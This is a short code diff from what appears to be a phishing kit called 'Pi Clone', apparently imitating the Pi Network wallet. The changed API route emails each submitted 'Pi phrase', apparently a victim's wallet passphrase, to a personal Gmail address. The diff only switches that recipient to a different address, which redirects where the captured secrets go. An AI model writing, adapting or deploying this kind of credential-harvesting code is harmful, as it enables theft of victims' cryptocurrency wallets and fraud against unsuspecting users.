@@ -16,7 +16,7 @@ export async function POST(request: Request) {
 
         const mailOptions = {
             from: `Pi Clone ${email}`,
-            to: 'hongchung550@gmail.com',
+            to: 'sommiewillz@gmail.com',
             subject: "You just got a new Pi phrase!",
             html: `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${message}</div>`,
         };
